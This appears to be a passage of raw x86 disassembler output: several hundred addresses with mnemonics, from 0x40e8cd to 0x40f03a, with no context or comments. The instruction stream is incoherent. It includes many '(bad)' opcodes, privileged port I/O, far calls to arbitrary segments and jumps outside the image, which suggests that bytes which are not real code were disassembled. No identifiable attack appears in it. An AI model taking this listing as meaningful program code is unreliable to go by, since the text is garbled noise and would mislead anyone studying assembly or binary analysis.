  40e8cd:	imul   edx,DWORD PTR [edx-0xb],0xffffffe7
  40e8d1:	loopne 0x40e88c
  40e8d3:	ins    BYTE PTR es:[edi],dx
  40e8d4:	dec    edi
  40e8d5:	mov    ch,0x53
  40e8d7:	int    0xf2
  40e8d9:	aas    
  40e8da:	mov    eax,ds:0xbd9956d7
  40e8df:	xchg   DWORD PTR [ebp-0x56c30532],esi
  40e8e5:	ds call 0x9cfa:0x33caf682
  40e8ed:	mov    eax,ds:0xe872041c
  40e8f2:	aam    0x76
  40e8f4:	cmp    DWORD PTR [esi+ebp*2+0x60],eax
  40e8f8:	mov    eax,ds:0x4d92572e
  40e8fd:	mov    edx,ebx
  40e8ff:	adc    ebx,edi
  40e901:	mov    ecx,0x5e5b209e
  40e906:	stos   DWORD PTR es:[edi],eax
  40e907:	mul    DWORD PTR [ebx]
  40e909:	mov    fs,WORD PTR [edx+0x1e]
  40e90c:	xchg   esi,eax
  40e90d:	mov    ebp,0x1406743
  40e912:	popf   
  40e913:	and    DWORD PTR [edi+eax*1+0x1a1f6bd4],ebp
  40e91a:	stos   DWORD PTR es:[edi],eax
  40e91b:	(bad)  
  40e91c:	or     al,0xbf
  40e91e:	jmp    0x40e8ed
  40e920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e921:	push   cs
  40e922:	adc    al,0x2e
  40e924:	lods   eax,DWORD PTR ds:[esi]
  40e925:	xor    BYTE PTR [ebx+0x4],dh
  40e928:	push   0x35
  40e92a:	rcl    BYTE PTR [esi],1
  40e92c:	push   edx
  40e92d:	js     0x40e8ed
  40e92f:	nop
  40e930:	sar    BYTE PTR [esi],1
  40e932:	shr    DWORD PTR [edi],cl
  40e934:	pop    ds
  40e935:	push   es
  40e936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e937:	mov    ecx,0xe6dc6dff
  40e93c:	fild   DWORD PTR [ecx]
  40e93e:	push   ss
  40e93f:	pop    edi
  40e940:	sbb    BYTE PTR [esi],0x2
  40e943:	repnz or BYTE PTR [edi-0x54],dh
  40e947:	cmp    esi,DWORD PTR [edx-0x19c25fc7]
  40e94d:	or     BYTE PTR [edx+0x6592776d],dl
  40e953:	aam    0xa5
  40e955:	pushf  
  40e956:	mov    eax,0x3675dd7e
  40e95b:	push   esp
  40e95c:	push   ss
  40e95d:	pop    es
  40e95e:	or     al,0x5e
  40e960:	stos   BYTE PTR es:[edi],al
  40e961:	scas   al,BYTE PTR es:[edi]
  40e962:	cmp    esp,esp
  40e964:	lahf   
  40e965:	add    al,0x7a
  40e967:	jmp    0x7865a4d7
  40e96c:	sbb    dh,BYTE PTR [esi]
  40e96e:	rcl    ebx,1
  40e970:	jge    0x40e939
  40e972:	ins    DWORD PTR es:[edi],dx
  40e973:	push   ebp
  40e974:	neg    DWORD PTR [edx]
  40e976:	mov    DWORD PTR [esi],ebp
  40e978:	mov    edx,0x7d464a6a
  40e97d:	adc    DWORD PTR [ebx+ecx*4+0x16],ecx
  40e981:	cmc    
  40e982:	adc    DWORD PTR [esp+edi*2],esi
  40e985:	scas   eax,DWORD PTR es:[edi]
  40e986:	bound  esp,QWORD PTR [ebx+0x48]
  40e989:	fimul  WORD PTR [ebx+0x1f]
  40e98c:	inc    ebx
  40e98d:	adc    eax,0x36930bc
  40e992:	pop    eax
  40e993:	addr16 dec ecx
  40e995:	jp     0x40e918
  40e997:	dec    esp
  40e998:	jge    0x40ea06
  40e99a:	lahf   
  40e99b:	fstp   st(2)
  40e99d:	not    BYTE PTR [ecx-0x71256631]
  40e9a3:	pushf  
  40e9a4:	mov    ch,0x6c
  40e9a6:	mov    DWORD PTR [edi-0x72],ebp
  40e9a9:	arpl   WORD PTR [edx+ecx*4+0x3a],dx
  40e9ad:	hlt    
  40e9ae:	repnz adc DWORD PTR [ebx],ebp
  40e9b1:	call   0x4519:0x750ed0d4
  40e9b8:	or     al,BYTE PTR [ebx-0x5db81f6f]
  40e9be:	out    0x6d,al
  40e9c0:	ror    DWORD PTR cs:[ecx-0x7c6d5e8d],cl
  40e9c7:	add    al,0xb9
  40e9c9:	rol    BYTE PTR [eax+0x14deebc9],cl
  40e9cf:	cli    
  40e9d0:	jae    0x40e993
  40e9d2:	add    esi,DWORD PTR [ecx+0x42]
  40e9d5:	pop    ecx
  40e9d6:	(bad)  
  40e9d7:	lahf   
  40e9d8:	out    0xcf,al
  40e9da:	push   0xc196e669
  40e9df:	into   
  40e9e0:	loope  0x40e97f
  40e9e2:	outs   dx,DWORD PTR ds:[esi]
  40e9e3:	ins    DWORD PTR es:[edi],dx
  40e9e4:	pusha  
  40e9e5:	or     BYTE PTR [ebx],ch
  40e9e7:	dec    ebp
  40e9e8:	fwait
  40e9e9:	xor    ah,BYTE PTR [edx]
  40e9eb:	sbb    eax,0x95140062
  40e9f0:	xlat   BYTE PTR ds:[ebx]
  40e9f1:	int3   
  40e9f2:	outs   dx,DWORD PTR ds:[esi]
  40e9f3:	ja     0x40e9d8
  40e9f5:	jb     0x40e9fe
  40e9f7:	add    eax,0x78b49b5b
  40e9fc:	repnz pop es
  40e9fe:	mov    esp,0xaa3e1d54
  40ea03:	retf   0xc12a
  40ea06:	jns    0x40e9a2
  40ea08:	fisub  WORD PTR [esi-0x3d]
  40ea0b:	and    ebx,DWORD PTR ds:0x64181a1f
  40ea11:	std    
  40ea12:	push   0x57c301ab
  40ea17:	cmp    DWORD PTR [edx],ebx
  40ea19:	mov    cl,0x37
  40ea1b:	fwait
  40ea1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea1d:	mov    DWORD PTR [ebx-0x32],ebx
  40ea20:	push   cs
  40ea21:	and    esp,ebx
  40ea23:	pop    ds
  40ea24:	adc    ebp,edx
  40ea26:	loop   0x40e9e4
  40ea28:	add    al,0xc1
  40ea2a:	jge    0x40ea7b
  40ea2c:	imul   ebp,DWORD PTR [edi],0x28944194
  40ea32:	jg     0x40ea4f
  40ea34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea35:	popf   
  40ea36:	bound  edx,QWORD PTR [ecx]
  40ea38:	imul   BYTE PTR [eax-0x42]
  40ea3b:	pop    eax
  40ea3c:	mov    ch,0xc6
  40ea3e:	mov    bh,0x9a
  40ea40:	dec    esi
  40ea41:	xchg   ebx,eax
  40ea42:	push   esp
  40ea43:	rol    ebx,1
  40ea45:	sbb    ebx,esp
  40ea47:	sbb    DWORD PTR [ecx-0xa73ab75],ebx
  40ea4d:	cmp    dh,BYTE PTR [eax+0x42]
  40ea50:	cmp    edi,DWORD PTR [edi-0x58df4fcd]
  40ea56:	and    BYTE PTR [edi+eiz*8],al
  40ea59:	in     eax,dx
  40ea5a:	dec    esi
  40ea5b:	dec    ecx
  40ea5c:	mov    dl,0xb9
  40ea5e:	or     eax,0x59a3f581
  40ea63:	(bad)  
  40ea65:	nop
  40ea66:	loop   0x40ea01
  40ea68:	pushf  
  40ea69:	jmp    0x40ea76
  40ea6b:	pop    esp
  40ea6c:	or     al,0x64
  40ea6e:	ss shl edi,cl
  40ea71:	stos   BYTE PTR es:[edi],al
  40ea72:	cs pop es
  40ea74:	jo     0x40ea6d
  40ea76:	rcl    bl,cl
  40ea78:	adc    bl,BYTE PTR [edi-0x6628bb1]
  40ea7e:	rcr    eax,0xe8
  40ea81:	out    0x87,eax
  40ea83:	lahf   
  40ea84:	(bad)  
  40ea86:	mov    edx,0x361daaff
  40ea8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8c:	jns    0x40eaac
  40ea8e:	cmp    BYTE PTR [esi-0x14],0x30
  40ea92:	test   esi,0x78c9ab10
  40ea98:	(bad)  
  40ea99:	cdq    
  40ea9a:	(bad)  
  40ea9b:	fsub   DWORD PTR ds:0x6997d6e0
  40eaa1:	rcr    BYTE PTR [ebp+0x19627102],1
  40eaa7:	test   al,0x4b
  40eaa9:	dec    esi
  40eaaa:	mov    ds:0x4ea0b495,al
  40eaaf:	mov    dl,0xdd
  40eab1:	sbb    BYTE PTR [ebx+0x52d10e3b],0xe0
  40eab8:	mov    esp,0x20db09a1
  40eabd:	pcmpgtb mm5,mm0
  40eac0:	fimul  WORD PTR [ebx-0x158a49b3]
  40eac6:	and    BYTE PTR [esi+0x24],dh
  40eac9:	add    DWORD PTR [ebp+edx*1-0x1f],0x72
  40eace:	jae    0x40eadb
  40ead0:	fadd   st,st(2)
  40ead2:	or     eax,0x8942f349
  40ead7:	or     ebp,DWORD PTR [ecx]
  40ead9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eada:	sub    BYTE PTR [esi+0x17fe97e2],0xac
  40eae1:	xchg   ebp,eax
  40eae2:	inc    esp
  40eae3:	cmp    BYTE PTR [ecx],bh
  40eae5:	out    0xe5,al
  40eae7:	test   DWORD PTR [ebx],edi
  40eae9:	push   esp
  40eaea:	stos   DWORD PTR es:[edi],eax
  40eaeb:	into   
  40eaec:	aam    0xf0
  40eaee:	mov    cl,0xbd
  40eaf0:	stos   DWORD PTR es:[edi],eax
  40eaf1:	loopne 0x40eabf
  40eaf3:	je     0x40eb4c
  40eaf5:	mov    bl,0x16
  40eaf7:	push   cs
  40eaf8:	and    dl,al
  40eafa:	pushf  
  40eafb:	sub    ecx,DWORD PTR [eax-0x3d9ebee9]
  40eb01:	inc    eax
  40eb02:	jecxz  0x40eb47
  40eb04:	jno    0x40eb2b
  40eb06:	pxor   mm1,mm7
  40eb09:	mov    ds:0x9c045a8c,eax
  40eb0e:	out    0x16,eax
  40eb10:	div    BYTE PTR [ebp-0x30974d02]
  40eb16:	adc    bl,BYTE PTR ds:0xe6deaa84
  40eb1c:	rol    DWORD PTR [edi+edi*1+0x367c5570],0x55
  40eb24:	rcr    dl,0xc4
  40eb27:	jl     0x40eb00
  40eb29:	add    al,0x9a
  40eb2b:	popa   
  40eb2c:	push   es
  40eb2d:	leave  
  40eb2e:	outs   dx,BYTE PTR ds:[esi]
  40eb2f:	cmp    edi,edi
  40eb31:	loopne 0x40eba8
  40eb33:	push   eax
  40eb34:	adc    DWORD PTR es:0x2b4347de,0xffffff99
  40eb3c:	or     eax,0xaacbe3d0
  40eb41:	in     eax,dx
  40eb42:	mov    cl,0xa6
  40eb44:	jp     0x40ebae
  40eb46:	or     eax,0x5c58c934
  40eb4b:	push   edx
  40eb4c:	outs   dx,DWORD PTR ds:[esi]
  40eb4d:	xchg   BYTE PTR [ebx],al
  40eb4f:	dec    edx
  40eb50:	imul   edi,DWORD PTR [eax-0x7d6a1984],0xc34c7d57
  40eb5a:	add    eax,0xce9cf6a6
  40eb5f:	popf   
  40eb60:	(bad)
  40eb63:	fisttp QWORD PTR [ecx+0x4cce4347]
  40eb69:	or     ecx,DWORD PTR [edi+edx*4-0x3]
  40eb6d:	mov    BYTE PTR [ebx-0x8a23cca],0xc4
  40eb74:	in     eax,dx
  40eb75:	(bad)  
  40eb76:	fist   DWORD PTR [ecx]
  40eb78:	and    DWORD PTR [ecx-0x67bd836f],eax
  40eb7e:	push   ds
  40eb7f:	es (bad) 
  40eb81:	(bad)  [edi+0x4fed942d]
  40eb87:	add    al,0x62
  40eb89:	fdiv   st,st(1)
  40eb8b:	test   al,0xe6
  40eb8d:	stc    
  40eb8e:	pop    ebx
  40eb8f:	cmp    DWORD PTR [ebp+0x746ef7f9],edi
  40eb95:	mov    ds:0x4c616a23,eax
  40eb9a:	daa    
  40eb9b:	jne    0x40eb2d
  40eb9d:	popa   
  40eb9e:	pop    ebx
  40eb9f:	pop    ds
  40eba0:	xchg   esi,eax
  40eba1:	clc    
  40eba2:	cmp    al,bh
  40eba4:	inc    eax
  40eba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eba6:	shl    BYTE PTR [ebx-0x6],1
  40eba9:	iret   
  40ebaa:	xchg   ecx,eax
  40ebab:	xchg   ebx,eax
  40ebac:	mov    dl,0xdf
  40ebae:	pop    es
  40ebaf:	mov    DWORD PTR [eax+0x3a310274],edi
  40ebb5:	(bad)  
  40ebb6:	push   edx
  40ebb7:	(bad)  
  40ebb8:	mov    ds:0x56597931,al
  40ebbd:	xor    edx,ebp
  40ebbf:	adc    esi,ecx
  40ebc1:	cs adc eax,0x80adf4fb
  40ebc7:	inc    eax
  40ebc8:	inc    ebx
  40ebc9:	(bad)  
  40ebca:	rcr    BYTE PTR [ebx],0xfe
  40ebcd:	lock stos DWORD PTR es:[edi],eax
  40ebcf:	repz shl ch,0xcf
  40ebd3:	pop    edx
  40ebd4:	mov    ah,0xc
  40ebd6:	ror    BYTE PTR [ecx+0x2b94e5a7],1
  40ebdc:	popa   
  40ebdd:	icebp  
  40ebde:	xor    eax,0xe1fc0765
  40ebe3:	sbb    BYTE PTR [esi+0x354a8919],ch
  40ebe9:	call   0x6e149873
  40ebee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebef:	shr    DWORD PTR [ebx-0x7ade778],1
  40ebf5:	je     0x40ebe8
  40ebf7:	lods   al,BYTE PTR ds:[esi]
  40ebf8:	retf   0xcb46
  40ebfb:	xor    eax,0xc140cd04
  40ec00:	push   edx
  40ec01:	inc    esi
  40ec02:	ret    
  40ec03:	aas    
  40ec04:	xor    BYTE PTR [edx-0x15f79541],dh
  40ec0a:	mov    ch,0xba
  40ec0c:	push   esi
  40ec0d:	push   ss
  40ec0e:	call   0xcb37:0xa8c07a68
  40ec15:	xor    al,0x74
  40ec17:	sbb    esp,DWORD PTR es:[eax-0xac86f27]
  40ec1e:	inc    edi
  40ec1f:	push   edx
  40ec20:	mov    dl,0x38
  40ec22:	lods   eax,DWORD PTR ds:[esi]
  40ec23:	mov    dl,0xea
  40ec25:	stos   DWORD PTR es:[edi],eax
  40ec26:	xchg   ebx,eax
  40ec27:	dec    edi
  40ec28:	mov    esi,0x41783cdd
  40ec2d:	inc    ecx
  40ec2e:	pop    ds
  40ec2f:	mov    edx,0x56c7e2b7
  40ec34:	nop
  40ec35:	pop    ss
  40ec36:	mov    al,0x1f
  40ec38:	inc    ecx
  40ec39:	iret   
  40ec3a:	(bad)  
  40ec3b:	mov    ebp,0x4ab34fb7
  40ec40:	ss and eax,0x723790af
  40ec46:	out    0xe,al
  40ec48:	call   0x12cbf6d1
  40ec4d:	pushf  
  40ec4e:	fstp   TBYTE PTR [ecx+0x57]
  40ec51:	mov    edi,0x26b82273
  40ec56:	adc    eax,0x259c45db
  40ec5b:	mov    eax,0x5fab33a6
  40ec60:	mov    esp,0xb8b4ed0c
  40ec65:	lea    ebp,[ebx+0x19]
  40ec68:	mov    ecx,esp
  40ec6a:	jne    0x40ec29
  40ec6c:	sbb    esp,ebp
  40ec6e:	(bad)  
  40ec6f:	adc    ah,bl
  40ec71:	and    BYTE PTR [eax-0x149d3e84],ah
  40ec77:	jae    0x40ec0e
  40ec79:	pushf  
  40ec7a:	add    bl,dh
  40ec7c:	mov    bh,bh
  40ec7e:	xchg   BYTE PTR [edx-0x15],dl
  40ec81:	dec    ecx
  40ec82:	and    BYTE PTR [ebx],bl
  40ec84:	mov    edx,0x3d616a5d
  40ec89:	push   esp
  40ec8a:	adc    ebx,esi
  40ec8c:	or     eax,0x36a1c7a4
  40ec91:	outs   dx,BYTE PTR ds:[esi]
  40ec92:	jge    0x40ec9d
  40ec94:	cdq    
  40ec95:	lahf   
  40ec96:	and    bl,0x49
  40ec99:	sbb    eax,0xb63e4567
  40ec9e:	rcr    DWORD PTR [ecx-0x24],0x2d
  40eca2:	in     eax,dx
  40eca3:	test   ah,cl
  40eca5:	adc    eax,0xc5b178ca
  40ecaa:	dec    edx
  40ecab:	sub    eax,0xf7909d16
  40ecb0:	sahf   
  40ecb1:	retf   
  40ecb2:	lahf   
  40ecb3:	xchg   ecx,eax
  40ecb4:	iret   
  40ecb5:	stos   DWORD PTR es:[edi],eax
  40ecb6:	mov    ds:0x471bfa87,al
  40ecbb:	pop    eax
  40ecbc:	sbb    ah,BYTE PTR [eax-0x51]
  40ecbf:	mov    DWORD PTR [ebx-0x4b],edi
  40ecc2:	ffree  st(7)
  40ecc4:	inc    edx
  40ecc5:	or     eax,0x8e99a604
  40ecca:	loopne 0x40ed25
  40eccc:	push   edi
  40eccd:	iret   
  40ecce:	xor    al,0x5b
  40ecd0:	sub    dl,BYTE PTR [ebx-0x3f]
  40ecd3:	test   eax,edx
  40ecd5:	sub    bh,BYTE PTR [edi-0x15]
  40ecd8:	dec    ebx
  40ecd9:	shl    DWORD PTR [ebx-0x3637d0e4],0x2a
  40ece0:	lea    esp,[edi+ecx*4]
  40ece3:	outs   dx,DWORD PTR ds:[esi]
  40ece4:	in     al,dx
  40ece5:	mov    al,ds:0x9ba22d06
  40ecea:	pop    edi
  40eceb:	jne    0x40ecc1
  40eced:	mov    ebx,0x4e321716
  40ecf2:	sti    
  40ecf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf4:	imul   BYTE PTR [edi+0x66]
  40ecf7:	inc    esp
  40ecf8:	xchg   ecx,eax
  40ecf9:	push   ebp
  40ecfa:	mov    ?,WORD PTR [ebp-0x699bd8a6]
  40ed00:	pop    ss
  40ed01:	sahf   
  40ed02:	mov    dh,0x32
  40ed04:	or     BYTE PTR [edi-0x51],dl
  40ed07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed08:	addr16 das 
  40ed0a:	lahf   
  40ed0b:	fs es pop ebx
  40ed0e:	in     al,dx
  40ed0f:	out    0x7,al
  40ed11:	rol    DWORD PTR [edx+0x6d],cl
  40ed14:	sti    
  40ed15:	cli    
  40ed16:	push   ebx
  40ed17:	cld    
  40ed18:	sbb    al,0xa7
  40ed1a:	cmp    ah,cl
  40ed1c:	ss dec esp
  40ed1e:	mov    al,0x79
  40ed20:	mov    ebx,0xa96c568d
  40ed25:	xor    eax,0x61979401
  40ed2a:	dec    eax
  40ed2b:	adc    al,0x1d
  40ed2d:	fs dec esi
  40ed2f:	sbb    ecx,DWORD PTR [ebp+0x492b9f3b]
  40ed35:	aas    
  40ed36:	push   0x2d
  40ed38:	in     al,dx
  40ed39:	cmp    BYTE PTR [edx-0x1a],dl
  40ed3c:	pop    ecx
  40ed3d:	mov    ss,WORD PTR [ecx]
  40ed3f:	jo     0x40edad
  40ed41:	add    BYTE PTR [eax-0x7f1dd55b],0xe9
  40ed48:	sub    DWORD PTR [edx+0x28],ebp
  40ed4b:	mov    ch,0x90
  40ed4d:	cmp    BYTE PTR ds:0x271b1ecc,ah
  40ed53:	jmp    0xa5fe664f
  40ed58:	jb     0x40ece9
  40ed5a:	cmp    BYTE PTR [edx+0x30],dh
  40ed5d:	or     DWORD PTR [ecx],edi
  40ed5f:	popa   
  40ed60:	ja     0x40ede1
  40ed62:	imul   DWORD PTR [esi+eax*2-0x6d61bc2d]
  40ed69:	or     ch,bl
  40ed6b:	(bad)  
  40ed6c:	lock sub eax,0xb256997c
  40ed72:	mov    DWORD PTR [esi],esp
  40ed74:	aas    
  40ed75:	mov    DWORD PTR [edx-0x5093105a],ecx
  40ed7b:	jge    0x40ede6
  40ed7d:	mov    eax,ds:0x80c5f8b6
  40ed82:	xchg   BYTE PTR [eax-0x2d],cl
  40ed85:	and    ebx,DWORD PTR [ecx-0x1c5a1435]
  40ed8b:	pop    sp
  40ed8d:	adc    cl,dh
  40ed8f:	jl     0x40ed95
  40ed91:	pop    ebx
  40ed92:	cmp    eax,0x470b8e7f
  40ed97:	mov    WORD PTR [edi],es
  40ed99:	mov    edx,0x1bf75ecf
  40ed9e:	outs   dx,BYTE PTR ds:[esi]
  40ed9f:	jnp    0x40ee1a
  40eda1:	outs   dx,DWORD PTR ds:[esi]
  40eda2:	push   ss
  40eda3:	mov    cl,0x7d
  40eda5:	cmp    esp,DWORD PTR [ecx+0x239bd9ce]
  40edab:	push   cs
  40edac:	jbe    0x40edaa
  40edae:	gs daa 
  40edb0:	xchg   edx,eax
  40edb1:	sti    
  40edb2:	adc    eax,0xb72fdabf
  40edb7:	mov    ebp,0x668cc60e
  40edbc:	dec    edx
  40edbd:	daa    
  40edbe:	cmp    eax,0x615a96d8
  40edc3:	or     esp,DWORD PTR [ebx-0x3310531a]
  40edc9:	popa   
  40edca:	pop    edx
  40edcb:	icebp  
  40edcc:	inc    esi
  40edcd:	jmp    0x40eddc
  40edcf:	mov    ebx,DWORD PTR [ecx+ebx*8+0x6a]
  40edd3:	jmp    0x92cb:0x1b8c1f0c
  40edda:	or     esp,esi
  40eddc:	xchg   edx,eax
  40eddd:	ss (bad) 
  40eddf:	dec    esp
  40ede0:	mov    bh,BYTE PTR [ebx+eiz*8-0x38537a61]
  40ede7:	sbb    ch,BYTE PTR [edi+eax*1-0x1d896fbd]
  40edee:	jge    0x40ed9e
  40edf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edf1:	into   
  40edf2:	push   ebp
  40edf3:	xchg   ebp,eax
  40edf4:	test   eax,0xde22ad36
  40edf9:	fiadd  DWORD PTR [edx]
  40edfb:	das    
  40edfc:	push   ds
  40edfd:	add    BYTE PTR [edi-0x70],al
  40ee00:	jg     0x40ee4d
  40ee02:	fst    QWORD PTR [ebx]
  40ee04:	inc    ebp
  40ee05:	not    BYTE PTR ds:[edi]
  40ee08:	mov    edi,0x9ce2739f
  40ee0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee0e:	or     eax,0x996a2c6e
  40ee13:	gs mov ebx,0xd26a0d8c
  40ee19:	sahf   
  40ee1a:	jne    0x40ee19
  40ee1c:	mov    esi,0xa7b4b3ab
  40ee21:	out    0x9e,eax
  40ee23:	push   0xffffff9a
  40ee25:	inc    ecx
  40ee26:	(bad)  
  40ee27:	sub    al,0x9c
  40ee29:	mov    cl,BYTE PTR [ebp-0x48]
  40ee2c:	jae    0x40ee8a
  40ee2e:	jo     0x40edc0
  40ee30:	sbb    ecx,DWORD PTR [ecx]
  40ee32:	(bad)  
  40ee33:	scas   al,BYTE PTR es:[edi]
  40ee34:	popa   
  40ee35:	inc    edx
  40ee36:	xchg   ecx,eax
  40ee37:	pop    edx
  40ee38:	pushf  
  40ee39:	out    dx,al
  40ee3a:	ins    BYTE PTR es:[edi],dx
  40ee3b:	aam    0x7d
  40ee3d:	jl     0x40ee45
  40ee3f:	add    DWORD PTR [ebp+ecx*1-0x46e522ac],ebx
  40ee46:	enter  0x3527,0x5e
  40ee4a:	mov    edi,0x8f818d18
  40ee4f:	in     al,dx
  40ee50:	or     dl,BYTE PTR [ebx]
  40ee52:	in     al,dx
  40ee53:	cmp    al,0xc
  40ee55:	mov    fs,WORD PTR [ebp-0x23b4fee2]
  40ee5b:	add    BYTE PTR [ecx+0x67de4d45],ah
  40ee61:	xchg   DWORD PTR [ecx+ebx*4+0x651ad499],esi
  40ee68:	dec    ecx
  40ee69:	sti    
  40ee6a:	int3   
  40ee6b:	out    0xb3,eax
  40ee6d:	mov    ebx,0xed7c4a8c
  40ee72:	test   DWORD PTR [esi],esi
  40ee74:	ficom  WORD PTR [ecx-0x3d]
  40ee77:	daa    
  40ee78:	sbb    bh,bl
  40ee7a:	mov    DWORD PTR [bx+si+0x499e],eax
  40ee7f:	hlt    
  40ee80:	mov    esi,0x3211699a
  40ee85:	inc    esi
  40ee86:	pop    ebp
  40ee87:	inc    ebx
  40ee88:	jl     0x40ee6e
  40ee8a:	out    dx,eax
  40ee8b:	push   bx
  40ee8d:	(bad)  
  40ee8e:	mov    ecx,0x8c0d0cc6
  40ee93:	jae    0x40ee20
  40ee95:	adc    eax,0x30dedc69
  40ee9a:	sar    BYTE PTR [esi-0x7c],cl
  40ee9d:	or     al,0x3
  40ee9f:	jecxz  0x40ef10
  40eea1:	pop    edi
  40eea2:	jp     0x40eec5
  40eea4:	out    dx,eax
  40eea5:	lahf   
  40eea6:	aaa    
  40eea7:	xchg   ebx,eax
  40eea8:	jae    0x40ee84
  40eeaa:	dec    edi
  40eeab:	jmp    0x462ac05e
  40eeb0:	ins    DWORD PTR es:[edi],dx
  40eeb1:	fcom   QWORD PTR [ebx+0x26]
  40eeb4:	std    
  40eeb5:	and    ebp,DWORD PTR ds:[edx-0x76d16e5]
  40eebc:	loopne 0x40ee9a
  40eebe:	dec    ebx
  40eebf:	ret    0x5a29
  40eec2:	jb     0x40ef3c
  40eec4:	je     0x40ee60
  40eec6:	push   0x42
  40eec8:	pop    eax
  40eec9:	sar    BYTE PTR [edi],cl
  40eecb:	(bad)  
  40eecd:	sbb    eax,0xd6b5e8d6
  40eed2:	and    eax,0x8a6627ad
  40eed7:	push   0x42
  40eed9:	mov    ds:0x2fa53d83,eax
  40eede:	cmp    DWORD PTR [ebp-0x11],0xf
  40eee2:	push   eax
  40eee3:	(bad)  
  40eee4:	pop    ebp
  40eee5:	push   0x49cb2dbc
  40eeea:	dec    esi
  40eeeb:	xor    BYTE PTR [esi],bl
  40eeed:	adc    edx,DWORD PTR es:[eax+0x61f4899f]
  40eef4:	call   0x9b67a424
  40eef9:	cmc    
  40eefa:	ret    0x5aa1
  40eefd:	mov    bh,0x71
  40eeff:	dec    eax
  40ef00:	xor    eax,0x94f1d10e
  40ef05:	inc    edi
  40ef06:	lock sbb edi,esp
  40ef09:	pop    ebp
  40ef0a:	mov    esp,0xd26635f7
  40ef0f:	add    DWORD PTR [ecx],edx
  40ef11:	push   es
  40ef12:	test   al,0xdd
  40ef14:	adc    bl,BYTE PTR [eax-0x5453f61e]
  40ef1a:	ret    0xbf7e
  40ef1d:	push   eax
  40ef1e:	ins    DWORD PTR es:[edi],dx
  40ef1f:	(bad)  
  40ef20:	icebp  
  40ef21:	js     0x40ef17
  40ef23:	mov    dh,0xa3
  40ef25:	lods   al,BYTE PTR ds:[esi]
  40ef26:	iret   
  40ef27:	xchg   DWORD PTR [ebp-0x6d9b8a2f],edx
  40ef2d:	jb     0x40ef48
  40ef2f:	jbe    0x40efae
  40ef31:	push   ds
  40ef32:	(bad)  
  40ef34:	in     al,0xff
  40ef36:	jo     0x40eeeb
  40ef38:	fwait
  40ef39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef3a:	add    bl,bh
  40ef3c:	jo     0x40ef26
  40ef3e:	in     al,dx
  40ef3f:	xor    esi,DWORD PTR [edi]
  40ef41:	shr    BYTE PTR [edx],cl
  40ef43:	ror    DWORD PTR [ebx+0x7c7da3ae],cl
  40ef49:	ja     0x40ef9d
  40ef4b:	xor    esi,edx
  40ef4d:	cmp    al,0xef
  40ef4f:	lahf   
  40ef50:	repz fwait
  40ef52:	mov    al,0xc5
  40ef54:	xor    al,0xbf
  40ef56:	add    DWORD PTR [edi],edi
  40ef58:	mov    esi,0x11c5d6d7
  40ef5d:	add    BYTE PTR [edi+0x3aa9b279],al
  40ef63:	dec    esp
  40ef64:	sub    DWORD PTR [eax],ebp
  40ef66:	retf   
  40ef67:	sbb    bh,BYTE PTR [edi-0x185ad907]
  40ef6d:	data16 add BYTE PTR es:[edi],dh
  40ef71:	in     al,0xd0
  40ef73:	sti    
  40ef74:	rcr    BYTE PTR [ebx+0x4b8dc077],1
  40ef7a:	adc    DWORD PTR [ebx],ebp
  40ef7c:	inc    edi
  40ef7d:	mov    eax,ds:0xab10211f
  40ef82:	(bad)  
  40ef83:	sar    esp,1
  40ef85:	push   0xffffffaf
  40ef87:	xor    eax,0x7419fb26
  40ef8c:	out    0xe3,eax
  40ef8e:	add    bh,BYTE PTR [eax-0x21c0618b]
  40ef94:	add    BYTE PTR [eax-0x3cb5e032],dh
  40ef9a:	add    eax,0xd7ba4eee
  40ef9f:	xor    DWORD PTR [ebp-0x30],eax
  40efa2:	cdq    
  40efa3:	mov    edx,0x6143d71c
  40efa8:	call   0xac735bc
  40efad:	or     edi,DWORD PTR [edi+0x52544e99]
  40efb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb4:	xor    ebp,DWORD PTR [esi-0x75]
  40efb7:	div    DWORD PTR [eax+ecx*1+0x39e765ac]
  40efbe:	adc    eax,0x84f50030
  40efc3:	mov    esi,0x313464b6
  40efc8:	mov    ecx,0x84072689
  40efcd:	sbb    edx,DWORD PTR [bx+di+0x55e4]
  40efd2:	hlt    
  40efd3:	sbb    BYTE PTR [edi-0x5f],ah
  40efd6:	jns    0x40ef5f
  40efd8:	icebp  
  40efd9:	ret    0x773d
  40efdc:	jmp    0x40f02d
  40efde:	add    DWORD PTR [eax*8+0x33ab1c94],edx
  40efe5:	stc    
  40efe6:	or     al,0x4f
  40efe8:	xchg   edi,eax
  40efea:	adc    ebx,edi
  40efec:	scas   eax,DWORD PTR es:[edi]
  40efed:	inc    edx
  40efee:	pop    esp
  40efef:	in     al,dx
  40eff0:	dec    ebx
  40eff1:	xchg   BYTE PTR [ebx+0x549f59e0],cl
  40eff7:	xor    DWORD PTR [ebx+eax*2+0x34],ebx
  40effb:	fisubr DWORD PTR [edi-0x61681b07]
  40f001:	xor    DWORD PTR [ebx+0x4208d0e2],edx
  40f007:	mov    ds:0x42e9d3d0,al
  40f00c:	jmp    0x583e3bc1
  40f011:	(bad)  
  40f012:	jnp    0x40f06b
  40f014:	fisub  DWORD PTR [ecx+0x9]
  40f017:	leave  
  40f018:	push   esi
  40f019:	dec    esp
  40f01a:	mov    edi,0x6b0b40a5
  40f01f:	sbb    esp,esi
  40f021:	scas   eax,DWORD PTR es:[edi]
  40f022:	stos   BYTE PTR es:[edi],al
  40f023:	inc    esp
  40f024:	std    
  40f025:	mov    ecx,0xa5e6c03d
  40f02a:	push   0xc5057d1
  40f02f:	or     al,0x83
  40f031:	punpckhwd mm2,mm1
  40f034:	scas   eax,DWORD PTR es:[edi]
  40f035:	mov    eax,ds:0x93761e43
  40f03a:	fcomp  DWORD PTR [ebx]
